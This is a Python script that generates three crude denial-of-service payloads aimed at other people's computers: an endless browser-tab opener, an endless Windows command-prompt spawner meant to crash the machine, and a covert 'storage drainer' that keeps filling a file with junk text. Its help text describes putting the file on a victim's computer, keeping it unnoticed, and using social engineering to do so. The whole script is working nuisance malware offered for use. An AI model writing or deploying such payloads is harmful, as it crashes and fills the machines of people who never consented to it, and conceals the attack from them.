import sys,os,webbrowser,subprocess,time

def main():
    choice = input("""
    1.Webcrasher will make loads of tabs open and overload the cpu.(any platform)
    2.CMD opener this will spam open cmd therefore crashing their computer.(windows only)
    3.Drain someones storage without them knowing(any platform)
    4.What these payloads do
Enter your choice: """)
    if choice == "1":
       webcrasher()
    elif choice == "2":
       cmd()
    elif choice == "3":
       storagedrainer()
    elif choice == "4":
       help()
def webcrasher():
    your_file = input("Enter the file you want to save the payload too it can also make a file so you can just type the directory of where you want the payload to be make it a py file text files are fine but you will have to change it to python aftewards to be able to run the payload ")
    f = open(your_file,"a")
    f.write("""import webbrowser
while True:
   url = "https://www.google.com/"
   webbrowser.open(url)""")                   
    f.close()
    print("Payload sent to",your_file)
    print("Thanks for using this program")
    main()


def cmd():
    print("Hello and welcome to cmd crasher guessing you want a cmd crashing payload you came to the right place")
    cmd_file = input("Enter the file you want the payload sending too make sure too use py extension: ")
    f = open(cmd_file, "a")
    f.write("""import subprocess
while True:
   subprocess.call('start',shell=True)""")
    f.close()
    print("Payload sent to",cmd_file)
    main()

def storagedrainer():
    print("Welcome to storage drainer this will make a file which you can put on the user's computer and then run and it will create a unknown file and start printing loads into it")
    what_file = input("Where do you want to save this file: ")
    f = open(what_file,"a")
    f.write("""
while True:
   f = open("j.txt","a")
   f.write("#################################################################################@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@############################################################################################################################################################################################################################################################################################################")
   f.close()""")
    print("Payload made saved to",what_file)
    main()

def help():
    print("""These payloads were made in python there not that hard to make but rookies may need help making them hence why I made this
    The spam tab opener is a simple program which uses a while loop to open lots of google tabs pretty self explaintary.
    The spam cmd is a windows only tool which opens the command shell on windows constantly until it is told to stop.
    The most complex one out of the three the memory drainer this makes a file in the directory where the python file is so for example
    if it was to be in documents on their computer it would make a file on documents and fill it with random text normally about 2mb per 2 seconds.
    Meaning in a minute you have drained 120mb leave it on for 10 min that's 1.2gb you get what Im getting at.
    Be wary with python they will be able to see that it is running at the bottom as a tab so be wary of that you may need to use a little
    social engineering""")
    time.sleep(20)
    main()


   
main()
